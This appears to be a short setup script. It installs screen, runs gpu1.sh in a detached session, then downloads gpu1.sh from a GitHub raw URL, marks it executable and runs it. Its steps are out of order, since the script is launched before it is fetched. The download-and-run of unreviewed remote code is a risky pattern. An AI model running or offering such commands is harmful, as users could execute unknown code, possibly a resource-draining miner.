#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu1.sh ./gpu1.sh 69 79
wget https://raw.githubusercontent.com/comandashtar/1446/main/gpu1.sh
chmod +x gpu1.sh
./gpu1.sh
